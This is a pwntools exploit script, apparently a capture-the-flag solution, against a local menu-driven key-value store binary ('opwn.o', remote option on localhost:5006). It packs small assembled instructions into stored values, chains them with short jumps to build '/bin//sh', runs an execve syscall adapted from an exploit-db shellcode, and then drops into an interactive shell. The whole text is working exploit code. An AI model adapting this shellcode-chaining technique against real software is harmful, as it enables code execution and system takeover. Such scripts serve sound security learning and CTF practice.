from pwn import *
context.arch = 'amd64'

if args.REMOTE:
    p = remote('localhost', 5006)
else:
    p = process("./dist/opwn.o")

def insert(k, v):
    p.sendlineafter("Option:", "1")
    p.sendlineafter("Key:", str(k))
    p.sendlineafter("Value:", str(v))

def lookup(k):
    p.sendlineafter("Option:", "2")
    p.sendlineafter("Key:", str(k))

def delete(i):
    p.sendlineafter("Option:", "3")
    p.sendlineafter("Index:", str(i))

def exec(a):
    num = u64(asm(a).ljust(6, b'\x90') + b'\xeb\x12')
    insert(0xcafebabedeadbeef, num)

insert(0xcafebabe00000000, 0x00000000deadbeef)      # entry to be deleted
insert(0x07eb9090aaaaaaaa, 0x12eb909090909090)      # setup the chain!      

exec('mov ebx, 0x68732f2f')
exec('mov eax, 0x6e69622f')
exec('shl rbx, 0x20')
exec('xor rbx, rax')

# from https://www.exploit-db.com/exploits/42179, modified a bit
exec('xor rax, rax')
exec('xor rsi, rsi')
exec('xor rdx, rdx')
exec('push rax')
exec('push rbx')
exec('mov rdi, rsp')
exec('mov al, 0x3b')
exec('syscall')


delete(0)

lookup(0x1221)

p.interactive()